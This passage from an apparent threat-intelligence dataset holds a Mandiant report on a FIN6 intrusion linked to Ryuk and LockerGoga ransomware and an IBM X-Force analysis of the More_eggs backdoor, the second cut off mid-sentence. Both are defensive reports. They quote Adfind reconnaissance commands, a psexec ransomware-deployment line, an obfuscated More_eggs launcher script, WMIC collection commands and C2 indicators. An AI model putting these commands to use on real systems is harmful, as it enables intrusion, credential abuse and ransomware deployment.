SP.FIN6.EN-US.042016"
fin6,cti-hal,347dcec65eb1,G0037,"Cloud Contact sales Get started for free Blog Solutions & technology Ecosystem Developers & Practitioners Transform with Google Cloud Threat Intelligence Pick-Six: Intercepting a FIN6 Intrusion, an Actor Recently Tied to Ryuk and LockerGoga Ransomware April 5, 2019 Mandiant Written by: Brendan McKeague, Van Ta, Ben Fedore, Geoff Ackerman, Alex Pennino, Andrew Thompson, Douglas Bienstock Summary Recently, FireEye Managed Defense detected and responded to a FIN6 intrusion at a customer within the engineering industry, which seemed out of character due to FIN6’s historical targeting of payment card data. The intent of the intrusion was initially unclear because the customer did not have or process payment card data. Fortunately, every investigation conducted by Managed Defense or Mandiant includes analysts from our FireEye Advanced Practices team who help correlate activity observed in our hundreds of investigations and voluminous threat intelligence holdings. Our team quickly linked this activity with some recent Mandiant investigations and enabled us to determine that FIN6 has expanded their criminal enterprise to deploy ransomware in an attempt to further monetize their access to compromised entities. This blog post details the latest FIN6 tactics, techniques, and procedures (TTPs), including ties to the use of LockerGoga and Ryuk ransomware families. It also highlights how early detection and response combined with threat intelligence gives Managed Defense customers a decisive advantage in stopping intruders before their goals manifest. In this instance, Managed Defense thwarted a potentially destructive attack that could have cost our customer millions of dollars due to business disruption. Detection and Response Managed Defense worked in tandem with the customer’s security team to acquire relevant log data, share findings from system analysis, and answer critical investigative questions. The customer was also undergoing a penetration test, so additional scrutiny was required in order to delineate between authorized testing activity and unauthorized activity attributed to FIN6. Our customer provided valuable insight into the role and importance of affected systems in preparation for entering Rapid Response. Rapid Response is a service offering that delivers incident response support to Managed Defense customers. As with any incident response service, the primary goal is to scope of the nature of the identified malicious activity and to assist our customers with a successful eradication event to eliminate the presence of adversaries. Managed Defense, utilizing FireEye Endpoint Security technology, detected and responded to the threat activity identified within the customer’s environment. The subsequent investigation revealed FIN6 was in the initial phase of an intrusion using stolen credentials, Cobalt Strike, Metasploit, and publicly available tools such as Adfind and 7-Zip to conduct internal reconnaissance, compress data, and aid their overall mission. Managed Defense investigated activity on two systems initially detected as compromised by FireEye Endpoint Security, the industry leading endpoint security solution that was ranked as the most effective endpoint detection and response (EDR) solution. The activity was detected by comprehensive real time methodology signatures designed to identify the most evasive adversary techniques. Pivoting from these initial leads, analysts identified suspicious SMB connections and Windows Registry artifacts that indicated the attacker had installed malicious Windows services to execute PowerShell commands on remote systems. Windows Event Log entries revealed the user account details responsible for the service installation and provided additional IOCs (Indicators of Compromise) to assist Managed Defense in scoping the compromise and identifying other systems accessed by FIN6. Managed Defense utilized Windows Registry Shellbag entries to reconstruct FIN6’s actions on compromised systems that were consistent with lateral movement. Attack Lifecycle Initial Compromise, Establish Foothold, and Escalate Privileges To initially gain access to the environment, Managed Defense analysts identified that FIN6 compromised an internet facing system. Following the compromise of this system, analysts identified FIN6 leveraged stolen credentials to move laterally within the environment using the Windows’ Remote Desktop Protocol (RDP). Following the RDP connection to systems, FIN6 used two different techniques to establish a foothold: First technique: FIN6 used PowerShell to execute an encoded command. The command consisted of a byte array containing a base64 encoded payload shown in Figure 1. Figure 1: Base64 encoded command The encoded payload was a Cobalt Strike httpsstager that was injected into the PowerShell process that ran the command. The Cobalt Strike httpsstager was configured to download a second payload from hxxps://176.126.85[.]207:443/7sJh. FireEye retrieved this resource and determined it was a shellcode payload configured to download a third payload from hxxps://176.126.85[.]207/ca. FireEye was unable to determine the final payload due to it no longer being hosted at the time of analysis. Second technique: FIN6 also leveraged the creation of Windows services (named with a random 16- character string such as IXiCDtPbtGWnrAGQ) to execute encoded PowerShell commands. The randomly named service is a by-product of using Metasploit, which creates the 16-character service by default. The encoded command contained a Metasploit reverse HTTP shellcode payload stored in a byte-array like the first technique. The Metasploit reverse HTTP payload was configured to communicate with the command and control (C2) IP address 176.126.85[.]207 with a randomly named resource such as “/ilX9zObq6LleAF8BBdsdHwRjapd8_1Tl4Y- 9Rc6hMbPXHPgVTWTtb0xfb7BpIyC1Lia31F5gCN_btvkad7aR2JF5ySRLZmTtY” over TCP port 443. This C2 URL contained shellcode that would make an HTTPS request for an additional download. To achieve privilege escalation within the environment, FIN6 utilized a named pipe impersonation technique included within the Metasploit framework that allows for SYSTEM-level privilege escalation. Internal Reconnaissance and Lateral Movement FIN6 conducted internal reconnaissance with a Windows batch file leveraging Adfind to query Active Directory, then 7-zip to compress the results for exfiltration: adfind.exe -f (objectcategory=person) > ad_users.txt adfind.exe -f objectcategory=computer > ad_computers.txt adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt adfind.exe -subnets -f (objectCategory=subnet) > ad_subnets.txt adfind.exe -f ""(objectcategory=group)"" > ad_group.txt adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt 7.exe a -mx3 ad.7z ad_* The outputs of the batch file included Active Directory users, computers, organizational units, subnets, groups, and trusts. With these outputs, FIN6 was able to identify user accounts that could access additional hosts in the domain. For lateral movement, FIN6 used another set of compromised credentials with membership to additional groups in the domain to RDP to other hosts. Maintain Presence Within two hours of the initial detection, the systems were contained using FireEye Endpoint Security. Through containment, attacker access to the systems was denied while valuable forensic evidence remained intact for remote analysis. Due to Managed Defense’s Rapid Response and containment, FIN6 was unable to maintain presence or achieve their objective. Through separate Mandiant Incident Response investigations, FireEye has observed FIN6 conducting intrusions to deploy either Ryuk or LockerGoga ransomware. The investigations observed FIN6 using similar tools, tactics, and procedures that were observed by FireEye Managed Defense during the earlier phases of the attack lifecycle. Mandiant observed additional indicators from the later attack lifecycle phases. Lateral Movement FIN6 used encoded PowerShell commands to install Cobalt Strike on compromised systems. The attacker made use of Cobalt Strike’s “psexec” lateral movement command to create a Windows service named with a random 16-character string on the target system and execute encoded PowerShell. In some cases, the encoded PowerShell commands were used to download and execute content hosted on the paste site hxxps://pastebin[.]com. Complete Mission FIN6 also moved laterally to servers in the environment using RDP and configured them as malware “distribution” servers. The distribution servers were used to stage the LockerGoga ransomware, additional utilities, and deployment scripts to automate installation of the ransomware. Mandiant identified a utility script named kill.bat that was run on systems in the environment. This script contained a series of anti-forensics and other commands intended to disable antivirus and destabilize the operating system. FIN6 automated the deployment of kill.bat and the LockerGoga ransomware using batch script files. FIN6 created a number of BAT files on the malware distribution servers with the naming convention xaa.bat, xab.bat, xac.bat, etc. These BAT files contained psexec commands to connect to remote systems and deploy kill.bat along with LockerGoga. FIN6 renamed the psexec service name to “mstdc” in order to masquerade as the legitimate Windows executable “msdtc.” Example strings from the deployment BAT files are shown in Figure 2. To ensure a high success rate, the attacker used compromised domain administrator credentials. Domain administrators have complete control over Windows systems in an Active Directory environment. start copy svchost.exe \\10.1.1.1\c$\windows\temp\start psexec.exe \\10.1.1.1 -u domain\domainadmin -p ""password"" -d -h -r mstdc -s -accepteula -nobanner c:\windows\temp\svchost.exe Figure 2: Strings from deployment BAT files Ransomware Ryuk is a ransomware that uses a combination of public and symmetric-key cryptography to encrypt files on the host computer. LockerGoga is ransomware that uses 1024-bit RSA and 128-bit AES encryption to encrypt files and leaves ransom notes in the root directory and shared desktop directory. Additional information about Ryuk and LockerGoga is available on the FireEye Intelligence portal: 18- 00015730 and 19-00002005 Attribution FIN6 has traditionally conducted intrusions targeting payment card data from Point-of-Sale (POS) or eCommerce systems. This incident’s targeting of the engineering industry would be inconsistent with that objective. However, we have recently identified multiple targeted Ryuk and LockerGoga ransomware incidents showing ties to FIN6, through both Mandiant incident response investigations and FireEye Intelligence research into threats impacting other organizations. We have traced these intrusions back to July 2018, and they have reportedly cost victims tens of millions of dollars. As the frequency of these intrusions deploying ransomware have increased, the cadence of activity traditionally attributed to FIN6—intrusions targeting point-of-sale (POS) environments, deploying TRINITY malware and sharing other key characteristics—has declined. Given that, FIN6 may have evolved as a whole to focus on these extortive intrusions. However, based on tactical differences between these ransomware incidents and historical FIN6 activity, it is also possible that some FIN6 operators have been carrying out ransomware deployment intrusions independently of the group’s payment card breaches. Which of those scenarios is happening would influence how pressing a threat the group’s card data breach tactics continue to be. Criminal operations and relationships are highly adaptable, so we commonly encounter such attribution challenges in regards to criminal activity. Given that these intrusions have been sustained for almost a year, we expect that continued research into further intrusion attempts may enable us to more fully answer these questions regarding FIN6’s current status. Indicators Type Indicator 31.220.45[.]151 46.166.173[.]109 62.210.136[.]65 89.105.194[.]236 93.115.26[.]171 103.73.65[.]116 176.126.85[.]207 185.202.174[.]31 185.202.174[.]41 185.202.174[.]44 185.202.174[.]80 185.202.174[.]84 185.202.174[.]91 185.222.211[.]98 hxxps://176.126.85[.]207:443/7sJh Network hxxps://176.126.85[.]207/ca hxxps://176.126.85[.]207:443/ilX9zObq6LleAF8BBdsdHwRjapd8_1Tl4Y- 9Rc6hMbPXHPgVTWTtb0xfb7BpIyC1Lia31F5gCN_btvkad7aR2JF5ySRLZmTtY hxxps://pastebin[.]com/raw/0v6RiYEY hxxps://pastebin[.]com/raw/YAm4QnE7 hxxps://pastebin[.]com/raw/p5U9siCD hxxps://pastebin[.]com/raw/BKVLHWa0 hxxps://pastebin[.]com/raw/HPpvY00Q hxxps://pastebin[.]com/raw/L4LQQfXE hxxps://pastebin[.]com/raw/YAm4QnE7 hxxps://pastebin[.]com/raw/p5U9siCD hxxps://pastebin[.]com/raw/tDAbbY52 hxxps://pastebin[.]com/raw/u9yYjTr7 hxxps://pastebin[.]com/raw/wrehJuGp hxxps://pastebin[.]com/raw/tDAbbY52 hxxps://pastebin[.]com/raw/wrehJuGp hxxps://pastebin[.]com/raw/Bber9jae 031dd207c8276bcc5b41825f0a3e31b0 0f9931210bde86753d0f4a9abc5611fd 12597de0e709e44442418e89721b9140 32ea267296c8694c0b5f5baeacf34b0e 395d52f738eb75852fe501df13231c8d 39b7c130f1a02665fd72d65f4f9cb634 3c5575ce80e0847360cd2306c64b51a0 46d781620afc536afa25381504059612 4ec86a35f6982e6545b771376a6f65bb 73e7ddd6b49cdaa982ea8cb578f3af15 8452d52034d3b2cb612dbc59ed609163 8c099a15a19b6e5b29a3794abf8a5878 9d3fdb1e370c0ee6315b4625ecf2ac55 Host d2f9335a305440d91702c803b6d046b6 34187a34d0a3c5d63016c26346371b54 ad_users.txt ad_trustdmp.txt ad_subnets.txt ad_ous.txt ad_group.txt ad_computers.txt 7.exe Kill.bat Svchost.exe Mstdc.exe Detecting the Techniques The following table contains several specific detection names, including methodology detections for several tools and techniques that applied to the initial infection activity as well as additional detection names for the ransomware used by FIN6. Platform Signature Name Endpoint Security METASPLOIT A (METHODOLOGY) SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) BEACON A (FAMILY) SYSNATIVE ALIAS RUNDLL32.EXE (METHODOLOGY) Network Security and Email Security FE_Ransomware_Win64_Ryuk_1 FE_Ransomware_Win_LOCKERGOGA_1 FE_Ransomware_Win_LOCKERGOGA_2 FE_Ransomware_Win32_LOCKERGOGA_1 FE_Ransomware_Win32_LOCKERGOGA_2 FE_Ransomware_Win64_LOCKERGOGA_1 Posted in Threat Intelligence—Security & Identity Related articles Threat Intelligence Threat Intelligence Threat Intelligence Threat Intelligence Holes in Your Bitbucket: Why Your CI/CD Pipeline Is Leaking Secrets By Mandiant • 5-minute read Uncharmed: Untangling Iran's APT42 Operations By Mandiant • 58-minute read Ransomware Protection and Containment Strategies: Practical Guidance for Hardening and Protecting Infrastructure, Identities and Endpoints By Mandiant • 3-minute read From Assistant to Analyst: The Power of Gemini 1.5 Pro for Malware Analysis By Bernardo Quintero • 16-minute read Follow us Google Cloud Google Cloud Products Privacy Terms Help English"
fin6,cti-hal,08fd26244001,G0037,"More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 More_eggs, Anyone? Threat Actor ITG08 Strikes Again Light Dark August 29, 2019 By Ole Villadsen , Kevin Henson , Melissa Frydrych , Joey Victorino 14 min read Advanced Threats Incident Response https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 1 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 IBM X-Force Incident Response and Intelligence Services (IRIS) Malware responds to security incidents across the globe. During a recent incident response investigation, our team identiﬁed new attacks by the ﬁnancially motivated attack group ITG08, also known as FIN6. ITG08 is an organized cybercrime gang that has been active since 2015, mostly targeting point-of-sale (POS) machines in brick-and-mortar Threat Intelligence retailers and companies in the hospitality sector in the U.S. and Europe. More recently, the group has been observed targeting e-commerce environments by injecting malicious code into online checkout pages of compromised websites — a technique known as online skimming — thereby stealing payment card data transmitted to the vendor by unsuspecting customers. Based on our investigation and analysis of its adversarial tactics, techniques and procedures (TTPs), we believe ITG08 is actively attacking multinational organizations, targeting speciﬁc employees with spear phishing emails advertising fake job advertisements and repeatedly deploying the More_eggs JScript backdoor malware (aka Terra Loader, SpicyOmelette). This tool, a TTP observed in ITG08 attacks since 2018, is sold on the dark web by an underground malware-as-a- service (MaaS) provider. Attackers use it to create, expand and cement their foothold in compromised environments. Past campaigns by ITG08 using the More_eggs backdoor were last reported in February 2019. In the campaign we investigated, the attackers employed additional TTPs historically associated with ITG08, including the use of Windows Management Instrumentation (WMI) to automate the remote execution of PowerShell scripts, PowerShell commands with base64 encoding, and Metasploit and PowerShell to move laterally and deploy malware. Lastly, the attackers used Comodo code-signing certiﬁcates several times during the course of the campaign. Many of the above TTPs are not unique to ITG08, but collectively, and with the use of More_eggs, strengthen the link to this group. https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 2 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 Let’s take a closer look at ITG08’s TTPs that are relevant to the campaign we investigated, starting with its spear phishing and intrusion tactics and covering information on its use of the More_eggs backdoor. Please note that Visa has attributed the use of this backdoor to FIN6 in attacks that took place in 2018. Further linking the activity with the same threat actor, several of the network indicators and TTPs we encountered in this case — including the use of fake job advertisements as a lure in spear phishing — overlap with those reported earlier in 2019 by both Visa and Proofpoint researchers. Analysis of the Intrusion ITG08’s TTPs in compromising targeted organizations follow the typical framework for APT attacks. The following sections go over the steps taken by the attackers to gain an initial foothold and persist on the victimized organization’s networks. Initial Compromise To gain access to victim environments, the threat actor began by targeting handpicked employees using LinkedIn messaging and email, advertising fake jobs to lure recipients into checking into the supposed offers. In one case, we uncovered evidence indicating that the attacker had established communication with a victim via email and convinced them to click on a Google Drive URL purporting to contain an attractive job advert. Once clicked, the URL displayed the message, “Online preview is not available,” then presented a second URL leading to a compromised or rogue domain, where the victim could download the payload under the guise of a job description: https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 3 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 Figure 1: Link provided in spear phishing email to an employee That URL, in turn, downloaded a ZIP ﬁle containing a malicious Windows Script File (WSF) that initiated the infection routine of the More_eggs backdoor: Figure 2: Final landing page that downloads a malicious ﬁle Based on ﬁle system artifacts examined during our investigation, the ZIP ﬁle and WSF ﬁles were deleted upon a successful malware infection, likely in an attempt to prevent researchers from recovering the original ﬁles from the ﬁlesystem. The ﬁlesystem, however, contained evidence of a nonmalicious decoy document dropped to the disk drive during the https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 4 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 spear phishing attacks. Gaining a Foothold The spear phishing attacks unfortunately led to initial compromise and the installation of the More_eggs JScript backdoor, which established a reverse shell connection to the attacker’s command-and-control (C&C) infrastructure. Additional capabilities of the More_eggs malware include the download and execution of ﬁles and scripts and running commands using cmd.exe. X-Force IRIS determined that the More_eggs backdoor later downloaded additional ﬁles, including a signed binary shellcode loader and a signed Dynamic Link Library (DLL), as described below, to create a reverse shell and connect to a remote host. The shellcode loader was observed on one infected device as updater.exe with the Metasploit-style service name APTYnDS1ABEuUHEA, indicating that it was installed as a service. Reconnaissance, Lateral Movement and Privilege Escalation Once the attackers established a foothold on the network, they employed WMI and PowerShell techniques to perform network reconnaissance and move laterally within the environment. This type of method, called living off the land, can often blend with legitimate system administration activities, which can make it challenging for security controls to detect. The attackers used this technique to remotely install a Metasploit reverse TCP stager on select systems, subsequently spawning a Meterpreter session and Mimikatz. Meterpreter is a payload component in the Metasploit Framework that uses in-memory DLL injection, which can lead to a compromise by malware or any malicious code/commands. Mimikatz is a post-exploitation tool that allows attackers to extract credentials from volatile memory. Stolen credentials are usually leveraged to facilitate privilege escalation and further lateral movement through the compromised environment. Once the Metasploit reverse TCP stager executed, it downloaded and https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 5 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 loaded a second stage Meterpreter DLL into memory, allowing the attacker to spawn a Meterpreter session via a handler and initiate the loading of extensions, such as Mimikatz. In addition to the More_eggs malware, the attacker leveraged in-memory attacks by injecting malicious code, in this case Mimikatz, into legitimate system processes. Establishing Persistence To cement their foothold and add persistence throughout the compromised environment, X-Force IRIS uncovered evidence that the attacker had selected several additional devices on which to install the More_eggs backdoor, creating redundancy in ways to get back into the network. ITG08 remotely connected to these devices using PowerShell and WMI and downloaded and executed a DLL ﬁle, subsequently installing More_eggs on the device without dropping the nonmalicious decoy document. More_eggs: Malware Analysis ITG08 Leveraging a Malware-as-a-Service Provider A recently rising attack tool in ITG08 campaigns has been the More_eggs JScript backdoor. But while it was recently identiﬁed with ITG08 activity, the More_eggs backdoor is apparently developed and sold through an underground MaaS provider. This vendor not only supplies the backdoor malware, but also offers related technical services, such as preparing the network infrastructure to download More_eggs-related ﬁles and furnishing resources for C&C purposes. In addition to More_eggs, the same underground vendor is also responsible for producing the signed DLL described below, which creates a reverse shell (ReverseShell Executable). We based this assessment on code similarities between the DLL and other samples created by the same vendor, including the DLL that drops the More_eggs backdoor. https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 6 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 Figure 3: Network indicators revealing the use of an underground MaaS vendor selling More_eggs and malicious infrastructure services The More_eggs Dropper DLL After a successful phishing attack in which users have opened emails and browsed to malicious links, ITG08 attackers install the More_eggs JScript backdoor on user devices alongside several other malware components. The process begins with the consistent execution of a malicious DLL using the legitimate regsvr32.exe Windows Utility. Once executed, the DLL is deleted from the system and its components are dropped to the system. Before being deleted, the DLL executes a string decoding routine that is designed to execute for about a minute, spiking central processing unit https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 7 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 (CPU) usage for the regsvr32.exe process. Once the strings are decoded, the More_eggs components are decrypted, dropped to the system (normally in the %APPDATA%\Microsoft\ or %ProgramData%\Microsoft\ directories) and executed. The observed strings appearing like HEX-encoded strings are shown below: Figure 4: Sample encoded and decoded strings More_eggs Components The More_eggs dropper DLL creates the following components on the infected device (further detail on each component in the chart follows in the next section): Sample File Name Description 5795C3AC7F57F.txt an obfuscated More_eggs JScript An XSL stylesheet ﬁle that contains 625222E09B6CD028459.txt used as a parameter when loader. Benign XML document occasionally 27603.docx executing the msxsl.exe utility. Benign Word Document decoy. The Decoy was not always dropped in the executions of the DLLs Click and scroll to view analyzed. full table Obfuscated script ﬁle that executes msxsl.exe with the appropriate parameters as arguments. Once A70613FF7F5DE98.txt the script executes, the More_eggs https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 8 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 msxsl.exe JScript is loaded into the memory space of msxsl.exe. Benign Microsoft Command Line Transformation Utility known to be used to execute malicious code and bypass application whitelisting. Figure 5: Components created by DLL msxsl.exe is executed by the script ﬁle A70613FF7F5DE98.txt, which is obfuscated as shown below: atry{ vargAIgdubHdgLUyze-*""*; varsxJarFkz-newActiveXObject(""WScript.Shell""): varfvxmsppxchpigEr-"".""; varaHswhYydhkeFoi-""t""; varawGxNhMbnWQJdvpeXi-""x""; varvMxloFBqVqduQwOnyd-fvxmsppxchpiqFr+aHsWhYydhkeFoi+awGxNhMbnWQJdvpeXi+aHsWhYydhkeFoi; varwwzezrUqjpDRRKDnRJ-""e""; var1KlktkuqmJxvbGWlWjT-{vxmsppxchpiqEr+wwzezrUqjpDRRKDnRJ+awGxNhMbnWQJdvpeXi+wwzezrUqjpDRRKDnRJ;|| varabIsPIxtmckNvuZwvj-qAIgdubHdgLUyze+""C:\\Users|\<username>|\AppData\\Roaming)\Microsoft\\""; varjulixGuiB-abisPIxtmckNvuzwvj+""ทร""+awGxNhMbnWQJdvpeXi+""s1""+1KIktkugmixvbGWIWjT+gAIgdublidgLUyze+""""+abIsPIxtmckNvuzwvj+ ""625222E09B6CD028459""+ vMxloFBqVqduQwOnyd+qAIgdubHdgLUyze+""""+abIsPIxtmckNvuZwvj+""5795C3AC7F57F""+vMxloFBqVqduQwOnyd+qAIgdubHdgLUyze; SxJarFkz.Run(julixGuiB,0); }catch(vIzDhjONAq)( a2WCwoJD=799; Figure 6: Obfuscated script ﬁle A70613FF7F5DE98.txt The use of msxsl.exe is a known tactic to execute malicious code and bypass application whitelisting. The deobfuscated command is built as follows: “C:\Users\<username>\AppData\Roaming\Microsoft\msxsl.exe” “C:\Users\ <username>\AppData\Roaming\Microsoft\625222E09B6CD028459.txt” “C:\Users\ <username>\AppData\Roaming\Microsoft\5795C3AC7F57F.txt” Once the above command is executed, the More_eggs JScript loader 5795C3AC7F57F.txt will deobfuscate the embedded More_eggs JScript. A sample loader is shown below. The start of the XSL ﬁle: https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 9 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 Figure 7: JScript loader sample The end of the XSL ﬁle: Figure 8: JScript loader sample The “select” value within the template tag points to the function in the msxsl:script tag, which will execute when the msxsl.exe command is run. The JScript loader ﬁle is highly obfuscated and decodes the More_eggs backdoor in a variety of ways, including RC4 decryption. Analyzing the More_eggs JScript Backdoor The analysis in this section details the functionality of More_eggs backdoor samples speciﬁc to this investigation, so please bear in mind that the same malware can be deployed differently in other campaigns and by alternate attackers. The core functionality of the samples analyzed in this campaign remained the same as described by previous researchers. We aimed to add additional detail about the inner workings of the malware, including its C&C communications flow, its ﬁlesystem activity, and some encryption and encoding schemes used by the samples we analyzed. The More_eggs backdoor is executed entirely in memory, never touching the ﬁlesystem in an unencrypted state. Notable conﬁguration data is hardcoded and includes its C&C server address, malware version number and an Rkey value, which is believed to identify campaign https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 10 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 perpetrators to the vendor: The Rkey value is appended with a two-byte, pseudorandomly generated string used to construct an RC4 key. The Rkey variable is part of the ciphering key used to encrypt C&C communications. The RC4 key is then used to encrypt data, which is additionally basE91 encoded and sent back to the C&C. BasE91 is a method for encoding binary as ASCII characters. Upon initial execution, the backdoor checks its environment to determine whether it is running with administrative or user privileges, and if proper components are present on the system. To check the user’s privilege level on the newly infected device, it attempts to read the registry key HKEY_USERS\S-1-5-19\Environment\TEMP; a successful read means it is running with administrative privileges, and the backdoor builds the path %ProgramData%\Microsoft. If it is not running with administrative privileges, the path %AppData%\Microsoft is used. The More_eggs backdoor obtains the username and computer name of the infected device, and if running with privileges, it reads the following registry key: HKEY_LOCAL_MACHINE\Software\Microsoft\Notepad\ <computername>. If not running with privileges, it reads the key HKEY_CURRENT_USER\SOFTWARE\Microsoft\Notepad\<username> instead. The data in these Windows registry keys is expected to be a comma- separated list of ﬁles with no extension. The .txt extension is appended to the name by the backdoor. If these ﬁles exist along with msxsl.exe in the proper location, either %ProgramData%\Microsoft or %AppData%\Microsoft, the malware’s execution continues. Once the environment is checked, the backdoor will check for network connectivity by sending an HTTP GET request to hxxp://www.w3[.]org/1999/XSL/Format, ensuring the response is “This is another XSL namespace\n.” GET /1999/XSL/Format HTTP/1.1 Accept: */* https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 11 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 Accept-Language: en-us UA-CPU: [CPU version] Click and scroll to view Accept-Encoding: gzip, deflate full table User-Agent: [User agent string here] Host: www.w3.org Connection: Keep-Alive, Figure 9: HTTP GET request If the connection is successful, the backdoor builds a string formatted with “|<random-value>|”. The random value is between 8 and 32 bytes long, RC4-encrypted, basE91 encoded, and subsequently sent to the C&C in an HTTP POST request. The RC4 key used is generated from the Rkey variable value: POST HTTP/1.1 Connection: Keep-Alive Accept: */* Accept-Language: en-us Click and scroll to view User-Agent: [User agent string] full table Content-Length: 36 Host: 6R+#9fWCy)htQSo4:H9&JSMTx|X[OEKj^gXE Figure 10: HTTP POST request The C&C response is expected to be between 8 and 32 bytes long, nothing is done with the server response. The random value acts as a handshake between the backdoor and the C&C, and during failure of any of the above, More_eggs sends an HTTP GET request to 8.8.8.8 with a pseudorandom 8 to 32-byte URI. GET /avIRga9sfvjGj3HCPGlgzaBXOof3u7wq HTTP/1.1 Connection: Keep-Alive Accept: */* Click and scroll to view Accept-Language: en-us full table User-Agent: [User agent string] https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 12 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 Host: 8.8.8.8 Figure 11: HTTP GET request to 8.8.8.8 If the handshake is successful, the backdoor proceeds to collect system information from the infected device using a series of WMIC commands. “%comspec% /c wmic path win32_Operatingsystem get SerialNumber /FORMAT:Textvaluelist | ﬁndstr /R /C:\” SerialNumber=\” > \”C:\\Users\\mal_re\\AppData\\Local\\Temp\\12025.txt\” & vol %HOMEDRIVE% > \”C:\\Users\\mal_re\\AppData\\Local\\Temp\\50573.txt\” & wmic csproduct get Name /FORMAT:Textvaluelist | ﬁndstr /R /C:\” Name=\” > /FO CSV /NH > Click and scroll to view \”C:\\Users\\mal_re\\AppData\\Local\\Temp\\58678.txt\” & tasklist full table \”C:\\Users\\mal_re\\AppData\\Local\\Temp\\39054.txt\” & ver > \”C:\\Users\\mal_re\\AppData\\Local\\Temp\\28535.txt\” & wmic os get ProductType /FORMAT:Textvaluelist | ﬁndstr /R /C:\” ProductType=\” > \”C:\\Users\\mal_re\\AppData\\Local\\Temp\\4140.txt\” & ipconﬁg | ﬁndstr /R /C:\”IPv4 Address\” > \” C:\\Users\\mal_re\\AppData\\Local\\Temp\\65390.txt\”” Figure 12: System information collection The infected device’s system information is written to several %Temp%\ <random-ﬁlenames>.txt ﬁles. The contents of the ﬁles are read and then the ﬁles themselves are deleted. The More_eggs backdoor accepts the following commands from its remote operator: Command Description d&exec Download and execute an executable (.exe or .dll). more_eggs Gtfo Click and scroll to view Delete the current More_eggs and replace it. Uninstall activity. full table https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 13 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 more_onion Execute a script. via_c Run a command using “cmd.exe /C”. Figure 13: More_eggs commands Meterpreter Reverse TCP Stagers Beyond using More_eggs as a backdoor, the attackers in this campaign also used offensive security tools and PowerShell scripts to carry out the different stages of the attack. The PowerShell scripts analyzed during our investigation contained Metasploit Reverse TCP stagers. These stagers were used to execute shellcode that connected back to an attacker’s server and injected Meterpreter components, such as Mimikatz, into the memory space of legitimate processes. After injecting Meterpreter into memory, the attacker had complete control of the infected device. The reverse TCP PowerShell stagers functioned as follows: 1. The reverse TCP PowerShell stagers were obfuscated with base64 encoding and GZip compression. This encoding scheme is standard for Meterpreter PowerShell stagers. The original command contained a base64-encoded loader script. 2. The loader script base64 decodes, Gzip decompresses and executes a Metasploit PowerShell reflection payload in memory. 3. The reflection payload base64 decodes a Meterpreter reverse TCP shellcode, injects it into memory using .NET reflection methods and executes the decoded shellcode. 4. The shellcode connects back to the attacker’s server. Meterpreter components, such as the core module and metsvr.dll, and extensions, such as Mimikatz, are injected into the memory space of a legitimate process. https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 14 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 Figure 14: Original command Figure 15: Decoded loader Figure 16: Decoded reflection payload Metasploit Shellcode Loader As our analysis continued, X-Force IRIS found a UPX-packed Metasploit shellcode loader (49340.txt) during the forensic investigation of compromised devices. This loader attempted to masquerade as the Apache Bench application and notably contained metadata and project paths (.PDB), indicating that it may be attempting to masquerade as other applications as well, a rather typical behavior for malicious binaries. The shellcode was loaded into memory and designed to receive an RC4- encrypted buffer, which was decrypted and executed in memory. The sample also contained a Comodo code-signing certiﬁcate issued to “MAHTEM LTD,” which we believe is one of a number of fake companies established to purchase the certiﬁcates. The sample we analyzed further contained ﬁve binary entries in a resource named “REGISTRY” — 35, 224, 409, 3908 and 4994 — each https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 15 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 containing some obfuscated shellcode. Once loaded into memory, the shellcode connected back to a remote host, receiving 4 bytes in return. Those were XORed with the string 0xad350bdd and had 0x100 added to it. This value was then used as the size speciﬁcation for the next received buffer, which was RC4-decrypted with the resulting 16-byte key and executed in memory. A ReverseShell Executable Yet another tool in the attackers’ arsenal for this campaign was a DLL backdoor executable that X-Force IRIS found during the investigation. When executed via its DllRegisterServer export function, the DLL connected to a remote host on port 443 and created a reverse shell. In this investigation, the DLL connected to 185[.]204[.]2[.]182 and contained a Comodo code-signing certiﬁcate issued to 